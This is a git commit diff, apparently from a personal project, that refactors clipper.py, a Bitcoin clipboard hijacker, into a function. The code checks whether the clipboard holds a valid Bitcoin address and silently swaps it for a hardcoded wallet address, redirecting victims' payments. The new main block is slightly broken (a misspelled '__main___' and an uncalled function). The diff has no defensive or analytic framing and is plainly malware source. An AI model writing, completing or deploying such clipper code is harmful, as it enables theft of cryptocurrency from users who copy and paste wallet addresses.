122ed8a21bbd64e8207862101c545e0d5b16a0cc
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-03-26 16:31:15 +0100

    create function for checking clipboard

--- clipper.py
+++ clipper.py
@@ -1,8 +1,13 @@
 from helpers.bitcoin import bitcoin
 from helpers.clipboard import clipboard
-
-switch_address: str = "bc1qg7dvftcxxw5cphdrn3ddhawr000ft3um9gs788"
-clipboard_contents: str = clipboard.contents()
-
-if bitcoin.is_valid_address(clipboard_contents) is True:
-    clipboard.set_contents(switch_address)
+    
+def bitcoinClipper(switch_address: str):
+    clipboard_contents: str = clipboard.contents()
+    
+    if bitcoin.is_valid_address(clipboard_contents) is True:
+        clipboard.set_contents(switch_address)
+    
+if __name__ == "__main___":
+    switch_address: str = "bc1qg7dvftcxxw5cphdrn3ddhawr000ft3um9gs788"
+    
+    bitcoinClipper
